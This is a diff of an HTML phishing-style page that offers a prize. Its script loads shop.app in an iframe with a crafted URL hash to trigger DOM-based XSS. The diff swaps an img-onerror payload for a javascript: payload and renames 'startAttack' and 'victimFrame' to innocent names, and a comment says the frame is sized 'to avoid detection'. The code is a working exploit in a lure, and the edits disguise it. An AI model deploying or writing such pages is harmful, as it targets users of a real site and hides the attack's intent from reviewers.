@@ -6,26 +6,26 @@
 <body>
     <h1>You've won a prize!</h1>
     <p>Click below to claim it on Shop.app!</p>
-    <button onclick="startAttack()">Claim Your Prize</button>
+    <button onclick="getPrize()">Claim Your Prize</button>
 
-    <iframe id="victimFrame" style="width: 500px; height: 500px; border: none;"></iframe> 
+    <iframe id="Frame" style="width: 500px; height: 500px; border: none;"></iframe> 
     <!-- Small, not invisible, to avoid detection -->
 
     <script>
-        function startAttack() {
-            const frame = document.getElementById('victimFrame');
+        function getPrize() {
+            const frame = document.getElementById('Frame');
             // Craft the malicious URL for the TARGET site
-            const maliciousHash = "#<img src=x onerror='alert(\"XSS: \" + document.domain)'>";
-            const maliciousUrl = "https://shop.app" + maliciousHash; 
+            const Hash = "#javascript:alert(1)";
+            const url = "https://shop.app" + Hash; 
 
             // Load the malicious URL into the iframe
-            frame.src = maliciousUrl;
+            frame.src = url;
 
             // After the iframe loads, RE-load the same URL to trigger the hashchange event
             frame.onload = function() {
                 console.log("Iframe loaded. Triggering hash change...");
                 // Re-setting the source is the key to triggering the hashchange event
-                setTimeout(() => { frame.src = maliciousUrl; }, 2000);
+                setTimeout(() => { frame.src = url; }, 2000);
             };
         }
     </script>
